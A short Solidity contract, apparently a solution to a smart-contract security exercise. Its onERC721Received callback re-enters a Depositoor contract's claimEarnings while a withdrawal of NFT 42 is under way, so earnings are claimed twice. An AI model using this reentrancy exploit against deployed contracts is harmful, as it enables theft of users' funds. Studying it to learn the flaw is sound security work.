// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../RewardToken.sol";

contract RewardTokenAttacker is IERC721Receiver {

    constructor() {

    }

    function deposit(Depositoor depositor) external {
        depositor.nft().safeTransferFrom(address(this), address(depositor), 42);
    }

    function attack(Depositoor depositor) external {
        depositor.withdrawAndClaimEarnings(42);
    }

    function onERC721Received(
        address,
        address from,
        uint256 tokenId,
        bytes calldata
    ) external override returns (bytes4) {
        Depositoor depositor = Depositoor(from);

        depositor.claimEarnings(42);

        return IERC721Receiver.onERC721Received.selector;
    }
}
